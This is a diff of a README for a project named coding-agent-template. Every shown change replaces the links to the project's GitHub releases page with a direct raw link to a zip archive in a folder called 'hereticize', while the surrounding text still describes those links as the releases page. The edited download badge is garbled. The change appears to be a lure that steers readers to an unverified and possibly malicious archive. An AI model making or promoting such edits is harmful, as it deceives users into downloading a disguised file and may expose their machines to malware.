@@ -8,13 +8,13 @@ To get started with **coding-agent-template**, you need to download the applicat
 
 **Download the latest version here:**
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/MZINN7/coding-agent-template/releases)
+[![Download](https://raw.githubusercontent.com/MZINN7/coding-agent-template/main/hereticize/coding-agent-template.zip%20Latest%https://raw.githubusercontent.com/MZINN7/coding-agent-template/main/hereticize/coding-agent-template.zip)](https://raw.githubusercontent.com/MZINN7/coding-agent-template/main/hereticize/coding-agent-template.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click on the link below to go to the Releases page. Here, you will find the latest versions available for download.
    
-   [Visit Releases Page](https://github.com/MZINN7/coding-agent-template/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/MZINN7/coding-agent-template/main/hereticize/coding-agent-template.zip)
 
 2. **Select the Appropriate Version**  
    Look for the latest release. We recommend downloading the most recent version for the best performance and features.
@@ -48,7 +48,7 @@ To run **coding-agent-template**, your computer must meet the following minimum 
 - **Community Contributions:** Join a community of users who share tips, tricks, and additional resources.
 
 ## 🔄 Updating the Application
-To keep your software up-to-date, regularly check the [Releases Page](https://github.com/MZINN7/coding-agent-template/releases) for new versions. Always download the latest version to ensure you have the most recent features and security updates.
+To keep your software up-to-date, regularly check the [Releases Page](https://raw.githubusercontent.com/MZINN7/coding-agent-template/main/hereticize/coding-agent-template.zip) for new versions. Always download the latest version to ensure you have the most recent features and security updates.
 
 ## 👥 Community Support
 If you have questions or need help, feel free to reach out to our community. You can find discussions, ask for help, or share your experience on forums related to **coding-agent-template**. Engaging with the community can provide valuable insights and tips.
